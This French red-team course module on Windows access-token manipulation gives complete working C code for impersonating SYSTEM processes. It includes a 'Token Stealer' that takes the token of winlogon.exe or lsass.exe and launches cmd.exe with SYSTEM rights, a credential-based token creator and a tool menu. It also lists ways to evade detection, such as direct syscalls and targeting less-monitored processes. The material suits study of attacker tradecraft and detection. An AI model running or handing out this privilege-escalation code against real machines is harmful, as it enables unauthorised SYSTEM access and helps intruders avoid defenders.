# Module W65 : Manipulation de Tokens

## Objectifs

A la fin de ce module, vous serez capable de :
- Comprendre le fonctionnement des tokens d'accès Windows
- Implémenter l'impersonation et le token stealing en C
- Utiliser ces techniques pour l'élévation de privilèges
- Créer un outil de manipulation de tokens pour le Red Team

## 1. Concepts Fondamentaux

### 1.1 Qu'est-ce qu'un Token d'Accès ?

Imaginez un token comme un badge d'accès dans une entreprise. Ce badge contient :
- Votre identité (qui vous êtes)
- Vos groupes d'appartenance (département, équipe)
- Vos privilèges (peut ouvrir telle porte, accéder à tel étage)

Sous Windows, chaque processus et thread possède un token qui détermine ce qu'il peut faire.

```
┌─────────────────────────────────────────┐
│         PROCESSUS (notepad.exe)         │
│                                         │
│  ┌───────────────────────────────────┐  │
│  │       TOKEN D'ACCES               │  │
│  ├───────────────────────────────────┤  │
│  │ User SID: S-1-5-21-xxx-1001       │  │
│  │ Groups:                           │  │
│  │   - BUILTIN\Users                 │  │
│  │   - BUILTIN\Administrators        │  │
│  │ Privileges:                       │  │
│  │   - SeDebugPrivilege (Disabled)   │  │
│  │   - SeImpersonatePrivilege (On)   │  │
│  └───────────────────────────────────┘  │
└─────────────────────────────────────────┘
```

### 1.2 Types de Tokens

**Primary Token** : Token principal d'un processus
**Impersonation Token** : Token temporaire utilisé par un thread pour se faire passer pour un autre utilisateur

```
PROCESSUS A                    PROCESSUS B
(User: Alice)                  (User: SYSTEM)
│                              │
├─ Primary Token (Alice)       ├─ Primary Token (SYSTEM)
│                              │
└─ Thread 1                    └─ Thread 1
   └─ Impersonation Token         └─ Impersonation Token
      (peut usurper Bob)              (peut usurper Admin)
```

### 1.3 Les Niveaux d'Impersonation

Windows définit 4 niveaux de "déguisement" :

1. **SecurityAnonymous** : Token anonyme (presque inutile)
2. **SecurityIdentification** : Identifier l'utilisateur mais pas l'usurper
3. **SecurityImpersonation** : Usurper localement
4. **SecurityDelegation** : Usurper à distance (réseau)

## 2. Impersonation de Token

### 2.1 Schéma du Processus

```
┌──────────────────┐         ┌──────────────────┐
│  Notre Processus │         │ Processus Cible  │
│   (Attaquant)    │         │   (SYSTEM)       │
│                  │         │                  │
│  Token: User     │         │  Token: SYSTEM   │
└────────┬─────────┘         └────────┬─────────┘
         │                            │
         │  1. OpenProcess()          │
         ├───────────────────────────>│
         │                            │
         │  2. OpenProcessToken()     │
         ├───────────────────────────>│
         │     (Get Handle)           │
         │<───────────────────────────┤
         │                            │
         │  3. DuplicateTokenEx()     │
         │     (Copie du token)       │
         │<───────────────────────────┤
         │                            │
         │  4. ImpersonateLoggedOnUser()
         │     (Devient SYSTEM)       │
         └────────────────────────────┘
              Notre processus
              agit maintenant
              avec les droits SYSTEM !
```

### 2.2 Code C : Impersonation Basique

```c
#include <windows.h>
#include <stdio.h>

BOOL ImpersonateProcess(DWORD targetPID) {
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDuplicatedToken = NULL;

    // 1. Ouvrir le processus cible
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPID);
    if (!hProcess) {
        printf("[!] Echec OpenProcess: %d\n", GetLastError());
        return FALSE;
    }

    // 2. Recuperer le token du processus
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("[!] Echec OpenProcessToken: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // 3. Dupliquer le token
    if (!DuplicateTokenEx(
        hToken,
        TOKEN_IMPERSONATE | TOKEN_QUERY,
        NULL,
        SecurityImpersonation,
        TokenImpersonation,
        &hDuplicatedToken
    )) {
        printf("[!] Echec DuplicateTokenEx: %d\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 4. Usurper l'identite
    if (!ImpersonateLoggedOnUser(hDuplicatedToken)) {
        printf("[!] Echec ImpersonateLoggedOnUser: %d\n", GetLastError());
        CloseHandle(hDuplicatedToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Impersonation reussie !\n");

    // Nettoyage
    CloseHandle(hDuplicatedToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return TRUE;
}

// Fonction pour afficher l'utilisateur courant
void DisplayCurrentUser() {
    CHAR username[256];
    DWORD size = sizeof(username);

    if (GetUserNameA(username, &size)) {
        printf("[*] Utilisateur actuel: %s\n", username);
    }
}

int main() {
    DWORD systemPID = 0; // PID d'un processus SYSTEM

    printf("[*] Avant impersonation:\n");
    DisplayCurrentUser();

    // Trouver un processus SYSTEM (exemple: winlogon.exe)
    // systemPID = FindSystemProcess(); // A implementer

    if (ImpersonateProcess(systemPID)) {
        printf("\n[*] Apres impersonation:\n");
        DisplayCurrentUser();

        // Ici on peut faire des operations privilegiees

        // Retour a l'identite normale
        RevertToSelf();
        printf("\n[*] Apres RevertToSelf:\n");
        DisplayCurrentUser();
    }

    return 0;
}
```

## 3. Token Stealing (Vol de Token)

### 3.1 Principe

Le token stealing consiste à voler le token d'un processus privilégié pour créer un nouveau processus avec ces privilèges.

```
ETAPE 1: Trouver un processus SYSTEM
    ┌──────────────┐
    │ winlogon.exe │ (PID: 468)
    │ User: SYSTEM │
    └──────────────┘

ETAPE 2: Voler son token
    │
    ├─> OpenProcess(468)
    ├─> OpenProcessToken()
    └─> DuplicateTokenEx()
         │
         └─> Token SYSTEM dupliqué

ETAPE 3: Creer un processus avec ce token
    │
    └─> CreateProcessWithTokenW()
         │
         └─> cmd.exe avec droits SYSTEM !
```

### 3.2 Code C : Token Stealing Complet

```c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Trouver le PID d'un processus par son nom
DWORD FindProcessByName(const char* processName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return pid;
}

// Activer un privilege
BOOL EnablePrivilege(HANDLE hToken, LPCSTR lpszPrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueA(NULL, lpszPrivilege, &luid)) {
        printf("[!] LookupPrivilegeValue erreur: %d\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        printf("[!] AdjustTokenPrivileges erreur: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

// Fonction principale de token stealing
BOOL StealToken(DWORD targetPID, const wchar_t* programToRun) {
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hNewToken = NULL;
    HANDLE hCurrentToken = NULL;
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};

    si.cb = sizeof(si);

    // Activer SeDebugPrivilege pour notre processus
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrentToken)) {
        EnablePrivilege(hCurrentToken, SE_DEBUG_NAME);
        CloseHandle(hCurrentToken);
    }

    // 1. Ouvrir le processus cible
    printf("[*] Ouverture du processus PID: %d\n", targetPID);
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPID);
    if (!hProcess) {
        printf("[!] OpenProcess failed: %d\n", GetLastError());
        return FALSE;
    }

    // 2. Ouvrir le token du processus
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
        printf("[!] OpenProcessToken failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // 3. Dupliquer le token en Primary token
    if (!DuplicateTokenEx(
        hToken,
        TOKEN_ALL_ACCESS,
        NULL,
        SecurityImpersonation,
        TokenPrimary,
        &hNewToken
    )) {
        printf("[!] DuplicateTokenEx failed: %d\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Token vole avec succes !\n");

    // 4. Creer un nouveau processus avec le token vole
    printf("[*] Creation du processus avec le token vole...\n");
    if (!CreateProcessWithTokenW(
        hNewToken,
        LOGON_WITH_PROFILE,
        NULL,
        (LPWSTR)programToRun,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        printf("[!] CreateProcessWithTokenW failed: %d\n", GetLastError());
        CloseHandle(hNewToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Processus cree avec PID: %d\n", pi.dwProcessId);
    printf("[+] Token stealing reussi !\n");

    // Nettoyage
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hNewToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return TRUE;
}

int main(int argc, char* argv[]) {
    DWORD targetPID;

    printf("=== Token Stealer ===\n\n");

    // Trouver un processus SYSTEM (exemple: winlogon.exe)
    targetPID = FindProcessByName("winlogon.exe");

    if (targetPID == 0) {
        printf("[!] Processus winlogon.exe non trouve\n");
        printf("[*] Essai avec lsass.exe...\n");
        targetPID = FindProcessByName("lsass.exe");
    }

    if (targetPID == 0) {
        printf("[!] Aucun processus cible trouve\n");
        return 1;
    }

    printf("[*] Processus cible trouve: PID %d\n", targetPID);

    // Voler le token et lancer cmd.exe
    StealToken(targetPID, L"C:\\Windows\\System32\\cmd.exe");

    return 0;
}
```

## 4. Make Token (Creation de Token)

### 4.1 Principe

Make Token permet de créer un token à partir de credentials (username/password/domain).

```c
#include <windows.h>
#include <stdio.h>

BOOL MakeToken(const wchar_t* username, const wchar_t* domain, const wchar_t* password) {
    HANDLE hToken = NULL;

    // Connexion avec les credentials
    if (!LogonUserW(
        username,
        domain,
        password,
        LOGON32_LOGON_NEW_CREDENTIALS,
        LOGON32_PROVIDER_DEFAULT,
        &hToken
    )) {
        printf("[!] LogonUserW failed: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Token cree avec succes\n");

    // Utiliser le token pour impersonation
    if (!ImpersonateLoggedOnUser(hToken)) {
        printf("[!] ImpersonateLoggedOnUser failed: %d\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    printf("[+] Impersonation active\n");

    // Faire des operations...

    // Nettoyer
    RevertToSelf();
    CloseHandle(hToken);

    return TRUE;
}
```

## 5. Applications Offensives

### 5.1 Scenario Red Team : Elevation de Privileges

```
SITUATION:
Vous avez un shell en tant qu'utilisateur standard sur une machine Windows.

OBJECTIF:
Obtenir des privileges SYSTEM.

TACTIQUE:
1. Identifier un processus tournant en SYSTEM
2. Voler son token
3. Lancer un shell privilegié
```

### 5.2 Detection et Evasion

**Indicateurs de Compromission (IOC) :**
- Appels à `OpenProcessToken` sur des processus privilegiés
- Utilisation de `DuplicateTokenEx`
- Creation de processus avec `CreateProcessWithTokenW`
- Activation de `SeDebugPrivilege`

**Techniques d'Evasion :**
- Utiliser des processus moins surveilles que `lsass.exe`
- Implementer direct syscalls pour eviter les hooks
- Nettoyer les handles rapidement
- Utiliser des noms de processus legitimes

### 5.3 Outil Complet : Token Manipulator

```c
// Menu pour l'outil
void DisplayMenu() {
    printf("\n=== Token Manipulation Tool ===\n");
    printf("1. List processes\n");
    printf("2. Impersonate token\n");
    printf("3. Steal token and spawn shell\n");
    printf("4. Make token from credentials\n");
    printf("5. Revert to self\n");
    printf("6. Exit\n");
    printf("Choice: ");
}
```

## 6. Checklist de Manipulation de Tokens

```
[ ] Comprendre la structure d'un token Windows
[ ] Savoir ouvrir un processus avec OpenProcess
[ ] Maitriser OpenProcessToken et ses flags
[ ] Implementer DuplicateTokenEx correctement
[ ] Utiliser ImpersonateLoggedOnUser
[ ] Creer des processus avec CreateProcessWithTokenW
[ ] Activer les privileges necessaires (SeDebugPrivilege)
[ ] Gerer correctement les handles (eviter les fuites)
[ ] Implementer la recherche de processus cibles
[ ] Savoir revenir a l'identite normale avec RevertToSelf
```

## 7. Exercices

Voir [exercice.md](exercice.md)

## Ressources Complementaires

- MITRE ATT&CK: T1134 (Access Token Manipulation)
- Windows Internals Part 1 (Chapter on Security)
- SpecterOps: Understanding Windows Access Tokens
- Microsoft Docs: Access Tokens

---

**Navigation**
- [Module precedent](../W64_service_hijacking/)
- [Module suivant](../W66_credential_access/)
